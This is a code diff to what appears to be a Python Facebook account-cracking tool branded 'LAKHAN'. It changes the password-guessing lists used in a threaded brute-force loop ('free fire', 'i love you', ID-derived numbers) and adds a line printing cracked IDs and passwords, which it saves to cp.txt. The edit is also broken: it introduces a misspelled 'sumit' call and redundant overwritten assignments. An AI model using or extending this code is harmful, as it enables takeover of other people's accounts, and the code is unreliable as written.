@@ -172,7 +172,7 @@ logo = """''\033[1;33m
                                                    
 \033[1;31m($)=============================================
 \033[1;36m[$] \033[1;34mCREATED BY   : » \033[1;34mOWNER LAKHAN
-\033[1;32m[$] \033[1;36mFACEBOK      : » \033[1;36mHONEY LAKHAN
+\033[1;32m[$] \033[1;36mFACEBOK      : » \033[1;36mLAKHAN
 \033[1;37m[$] \033[1;37mGITHUB       : » \033[1;37mLAKHAN-404
 \033[1;33m[$] \033[1;34mSTATUS       : » \033[1;34mTOOL IS FREE
 \033[1;35m[$] \033[1;36mBRAND      : » \033[1;36m LAKHAN xD
@@ -278,9 +278,11 @@ def random_number():
 		for guru in user:
 			uid = kode+guru
 			mk = uid[:6]
+			pwx = [kode+guru,mk,'57575751','59039200','57273200']
+			mk = uid[:6]
 			pwx = [guru]
-			pwx = [kode+guru,mk,'57273200','59039200']
-			yaari.submit(rcrack,uid,pwx,tl)
+			pwx = [kode+guru,mk,'free fire','i love you','57273200']
+			yaari.sumit(rcrack,uid,pwx,tl)
 	print(47*"-")
 	print('[✓] Crack process has been completed')
 	print('[?] Ids saved in ok.txt,cp.txt')
@@ -354,7 +356,7 @@ def rcrack(uid,pwx,tl):
 
 				uid = coki[141:152]
 
-				
+				print('\r\033[1;32m[LAKHAN -CP] '+uid+' | '+ps)
 
 				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
 
